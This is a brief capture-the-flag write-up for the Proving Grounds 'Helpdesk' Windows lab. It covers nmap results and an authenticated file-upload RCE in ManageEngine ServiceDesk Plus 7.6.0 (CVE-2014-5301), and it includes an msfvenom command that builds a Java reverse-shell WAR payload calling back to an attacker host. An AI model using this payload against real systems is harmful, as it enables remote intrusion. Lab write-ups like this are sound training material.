---
title: "PG Practice: Helpdesk"
created: "2023-08-27"
updated: "2026-04-11"
type: ctf-writeup
platform: Proving Grounds Practice
machine: "Helpdesk"
os: Windows
status: rooted
tags:
  - - proving-grounds
  - pg-practice
  - windows
  - ctf
  - oscp
  - reverse-shell
  - file-upload-exploitation
  - file-upload
  - msfvenom-payload
  - netcat
related:
  - "[[Reverse-Shell-Reference]]"
  - "[[File-Upload-to-RCE-Patterns]]"
  - "[[Windows-PrivEsc-Decision-Tree]]"
  - "[[Nmap-Enumeration-Methodology]]"
---

# PG Practice: Helpdesk

> **Platform:** Proving Grounds Practice | **OS:** Windows | **Date:** 2023-08-27

---

## Quick Summary

**Open Ports:**
- 135/tcp (msrpc)
- 139/tcp (netbios-ssn)
- 445/tcp (microsoft-ds)
- 3389/tcp (ms-wbt-server)
- 8080/tcp (http)

**Key Techniques:**
- Reverse Shell
- File Upload Exploitation
- File Upload
- msfvenom Payload
- Netcat

**Privilege Escalation Path:**
- (See walkthrough)

---

## Full Walkthrough

Proving grounds Practice - Helpdesk CTF writeup.

## Nmap

```sh
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp open  ms-wbt-server Microsoft Terminal Service
8080/tcp open  http          Apache Tomcat/Coyote JSP engine 1.1
```

## Web PORT: 8080

ManageEngine Service Desk Plus version 7.6.0


The ManageEngine Service Desk Plus version 7.6.0 is vulnerable to authenticated [Remote Code Execution](https://github.com/PeterSufliarsky/exploits/blob/master/CVE-2014-5301.py) vulnerability via file upload.

## Create reverse TCP shell to upload

```sh
msfvenom -p java/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f war > shell.war
```

As specified in the code create a java reverse shell in the `.war` file format to upload.

Run netcat listener.

Run the exploit code.


**Reverse Shell Obtained**

---

## Technique Links

- [[Reverse-Shell-Reference]]
- [[File-Upload-to-RCE-Patterns]]
- [[Windows-PrivEsc-Decision-Tree]]
- [[Nmap-Enumeration-Methodology]]
- [[Proving-Grounds-Master-Index]]
